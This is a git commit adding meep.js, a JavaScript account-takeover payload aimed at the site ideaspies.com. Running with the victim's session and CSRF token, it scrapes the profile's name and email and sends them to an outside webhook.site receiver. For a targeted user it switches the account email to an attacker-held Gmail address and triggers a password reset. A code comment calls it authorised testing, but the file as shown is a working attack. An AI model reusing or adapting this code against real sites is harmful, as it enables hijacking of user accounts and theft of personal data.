0a17874e8395b39b45f225c8599fd70486503f9d
snoogem <jiajun.heng@students.mq.edu.au>
2020-10-27 16:06:38 +1100

    Create meep.js

---
+++ meep.js
@@ -0,0 +1,90 @@
+// Shanil, don't be alarmed. I've already told Lynn about this. Just testing stuff.
+let token = $('meta[name="csrf-token"]').attr('content')
+let targetUsername = 'felix heng'
+let targetEmail = 'ideaspy1001@gmail.com'
+let email = ''
+let name = ''
+
+// Can't be bothered coding www check
+fetch("https://ideaspies.com/user/admin/profile", {
+  "headers": {
+    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+    "accept-language": "en-GB,en;q=0.9",
+    "cache-control": "no-cache",
+    "pragma": "no-cache",
+    "sec-fetch-dest": "document",
+    "sec-fetch-mode": "navigate",
+    "sec-fetch-site": "same-origin",
+    "sec-fetch-user": "?1",
+    "upgrade-insecure-requests": "1"
+  },
+  "referrer": "https://ideaspies.com/user/admin/profile",
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": null,
+  "method": "GET",
+  "mode": "cors",
+  "credentials": "include"
+}).then(function (response) {
+	return response.text();
+}).then(function (html) {
+	// Send data to a server so original email can be saved
+	let parser = new DOMParser();
+	let doc = parser.parseFromString(html, 'text/html');
+	
+	name = doc.querySelector('#first_name').getAttribute('value');
+	email = doc.querySelector('#email').getAttribute('value');
+	let receiver = 'https://webhook.site/8723bbba-a23b-4937-b358-bc98f05698a2' // don't forget to change this
+	return fetch(receiver + '?email=' + email + '&name=' + name, {'mode':'no-cors'});
+}).then(function(response){
+	// Change email if username matches target, server automatically sets new password and uses stored email to change the profile back to normal
+	if (name.toLowerCase() === targetUsername) {
+		return fetch("https://ideaspies.com/user/admin/profile", {
+		  "headers": {
+		    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+		    "accept-language": "en-GB,en;q=0.9",
+		    "cache-control": "no-cache",
+		    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryPYa5L16IPdEEvuCR",
+		    "pragma": "no-cache",
+		    "sec-fetch-dest": "document",
+		    "sec-fetch-mode": "navigate",
+		    "sec-fetch-site": "same-origin",
+		    "sec-fetch-user": "?1",
+		    "upgrade-insecure-requests": "1"
+		  },
+		  "referrer": "https://ideaspies.com/user/admin/profile",
+		  "referrerPolicy": "strict-origin-when-cross-origin",
+		  "body": "------WebKitFormBoundaryPYa5L16IPdEEvuCR\r\nContent-Disposition: form-data; name=\"_token\"\r\n\r\n" + token + "\r\n------WebKitFormBoundaryPYa5L16IPdEEvuCR\r\nContent-Disposition: form-data; name=\"first_name\"\r\n\r\n" + name + "\r\n------WebKitFormBoundaryPYa5L16IPdEEvuCR\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n" + targetEmail + "\r\n------WebKitFormBoundaryPYa5L16IPdEEvuCR\r\nContent-Disposition: form-data; name=\"Profile_Picture\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryPYa5L16IPdEEvuCR--\r\n",
+		  "method": "POST",
+		  "mode": "cors",
+		  "credentials": "include"
+		});	
+	} else {
+		throw new Error('username mismatch');
+	}
+}).then(function (response) {
+	// Send password reset
+	return fetch("https://ideaspies.com/reset", {
+	  "headers": {
+	    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+	    "accept-language": "en-GB,en;q=0.9",
+	    "cache-control": "no-cache",
+	    "content-type": "application/x-www-form-urlencoded",
+	    "pragma": "no-cache",
+	    "sec-fetch-dest": "document",
+	    "sec-fetch-mode": "navigate",
+	    "sec-fetch-site": "same-origin",
+	    "sec-fetch-user": "?1",
+	    "upgrade-insecure-requests": "1"
+	  },
+	  "referrer": "https://ideaspies.com/reset",
+	  "referrerPolicy": "strict-origin-when-cross-origin",
+	  "body": "_token=" + token + "&email=" + encodeURIComponent(targetEmail),
+	  "method": "POST",
+	  "mode": "cors",
+	  "credentials": "include"
+	});
+}).then(function (response) {
+	
+}).catch(function (err) {
+
+});
